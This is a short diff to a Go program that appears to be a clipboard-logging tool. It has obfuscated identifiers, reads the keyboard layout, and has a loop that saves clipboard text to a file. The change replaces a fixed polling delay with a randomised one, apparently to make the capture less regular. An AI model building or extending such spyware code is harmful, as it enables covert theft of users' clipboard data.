@@ -7,6 +7,7 @@ package main
 import "C"
 import (
 	"fmt"
+	"math/rand"
 	"os"
 	"syscall"
 	"time"
@@ -54,6 +55,7 @@ var (
 
 func init() {
 	_c2 = int(C.GetKeyboardLayoutID())
+	rand.Seed(time.Now().UnixNano())
 }
 
 func g1() map[uint32]string {
@@ -233,7 +235,7 @@ func f6() {
 			_a3 = text
 			saveToFile("clipboard.txt", text)
 		}
-		time.Sleep(2 * time.Second)
+		time.Sleep(time.Duration(rand.Intn(5)+1) * time.Second)
 	}
 }
 
